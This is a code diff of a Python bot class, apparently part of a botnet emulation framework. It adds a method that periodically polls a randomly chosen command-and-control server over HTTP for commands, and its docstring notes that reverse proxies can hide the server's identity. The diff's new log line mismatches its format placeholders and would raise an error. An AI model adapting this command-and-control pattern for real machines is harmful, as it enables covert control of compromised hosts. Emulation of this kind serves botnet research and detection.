@@ -3,32 +3,49 @@
 import json, logging, random, requests
 
 from actors import BotCommands
-from actors.AbstractBot import CommandExecutor
+from AbstractBot import CommandExecutor
 from resources import emu_config
+from utils.LogfileParser import writeLogentry
 
 class Bot(CommandExecutor):
     """Implements a bot that, in regular intervals, fetches commands from the given CnC-Server
     and renews its registration with said server. The possible commands are defined in BotCommands.py."""
 
-    def __init__(self, peerlist=[], **kwargs):
+    def __init__(self, peerlist=None, **kwargs):
         super(Bot, self).__init__(**kwargs)
         self.current_command = None
         self.threads = []
-        self.peerlist = peerlist
+        self.peerlist = peerlist if peerlist is not None else list()
 
     def performDuty(self):
-        logging.debug("Doing duties")
-
         # If there is a CnC-Server in the current_peerlist
         if len(self.peerlist) > 0:
             try:
                 cncserver = random.choice(self.peerlist)
                 self._registerWithCnCServer(cncserver)
-                self.current_command = BotCommands.fetchCurrentCommand(cncserver, self.current_command)
+                self._fetchCurrentCommand(cncserver)
                 if self.current_command is not None:
                     self._executeCurrentCommand()
             except Exception as ex:
                 logging.debug("Duty of bot %s failed with %s: %s" % (self.name, type(ex).__name__, ex))
+
+    def _fetchCurrentCommand(self, cncserver):
+        """Fetches a command from the CnC-Server and executes. This way the Botmaster can control the clients.
+        The CnC-Server does not need to keep track of their addresses because they pull from it and reverse proxies
+        can be used, so that the clients do not need to know the identity of the CnC-Server. """
+
+        response = requests.get("http://%s:%s/current_command"%(cncserver, emu_config.PORT),
+                                headers={"Accept": "application/json"})
+        if response.status_code == 200:
+            newCmd = json.loads(response.text)
+            if newCmd != self.current_command:
+                logging.debug("Replaced command %s with %s"%(self.current_command, newCmd))
+                writeLogentry(runnable=type(self).__name__, message="received command: {'bot':%s, 'newcmd':%s, 'oldcmd':%s}"
+                                                                    %json.dumps(
+                    {"bot": self.name, "newcmd": newCmd, "oldcmd": self.current_command}))
+            self.current_command = newCmd
+        else:
+            self.current_command = None
 
     def _executeCurrentCommand(self):
         """Executes the last command that has been fetched from the CnC-Server"""
